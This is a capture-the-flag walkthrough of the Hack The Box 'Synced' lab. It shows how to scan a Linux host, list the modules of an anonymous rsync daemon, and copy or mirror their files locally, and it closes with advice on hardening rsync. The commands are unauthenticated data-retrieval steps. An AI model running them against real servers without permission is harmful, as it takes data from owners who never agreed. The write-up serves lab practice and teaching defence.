Yooo guys, it's ju4dy the landlord again.

# Synced — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 0 |
| **Difficulty** | Very easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.228.37` |
| **Skills** | `rsync` enumeration, anonymous module access, file transfer |

## Overview

Synced is a very easy Linux host running only an `rsync` daemon. Where an SMB or FTP server has shares behind
a login, `rsync` has modules, and a module that is published without authentication is readable by anyone.
This box exposes a single module called `public`, described by the server itself as an anonymous share.

Listing it is enough to find the flag, and one `rsync` command copies it locally.

## Enumeration

```bash
nmap -sVC 10.129.228.37
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-14 10:57 +0100
Nmap scan report for 10.129.228.37
Host is up (0.57s latency).
Not shown: 999 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.78 seconds
```

A single open port, `873`, with the `rsync` daemon protocol. The scan took almost two minutes, most of it spent
in version detection against this service — a reminder that separating a fast port sweep from `-sV` keeps
enumeration from stalling behind a slow probe.

### Listing modules

`rsync` addresses a daemon with a URL of the form `rsync://<host>/<module>/`. Without a module name, the
daemon lists what it publishes:

```bash
rsync --list-only rsync://10.129.228.37/
```

```text
public          Anonymous Share
```

The description is explicit about the access model. Listing the module then shows its contents:

```bash
rsync --list-only rsync://10.129.228.37/public/
```

```text
drwxr-xr-x          4,096 2022/10/24 23:02:23 .
-rw-r--r--             33 2022/10/24 22:32:03 flag.txt
```

## Capturing the flag

The file is copied down with the same client, giving a local path as the destination:

```bash
rsync rsync://10.129.228.37/public/flag.txt .
```

```bash
cat flag.txt
```

```text
[flag redacted]
```

The whole box is four commands: one scan, one listing of modules, one listing of a module, and one copy.

A full recursive mirror of the module is the same operation with the archive and verbose flags, and is what a
tester would use on a module holding more than one file:

```bash
rsync -av rsync://10.129.228.37/public/ ./loot/
```

For enumeration without the client, nmap ships a script for the same purpose:

```bash
nmap -p 873 --script rsync-list-modules 10.129.228.37
```

## Key takeaways

- **Anonymous modules are world-readable shares.** An `rsync` module should declare `auth users` and a
  `secrets file`, or be restricted with `hosts allow`, unless public read access is genuinely intended.
- **`rsync` can write as well as read.** A module configured with `read only = no` lets an anonymous client
  upload files, which turns a leak into a foothold; `read only = yes` is the safe default.
- **Service detection can take minutes.** The scan spent 118 seconds negotiating with the daemon; fast port
  sweeps and `-sV` are worth separating so enumeration is not blocked on a slow probe.
- **The service advertises its own exposure.** The module description `Anonymous Share` came from the daemon;
  banners and listings should be treated as reconnaissance performed by the server on its own behalf.
- **Do not put secrets in a synchronized directory.** Configuration files, backups and credentials are
  routinely copied into share directories, and this is the same data loss on a different protocol.
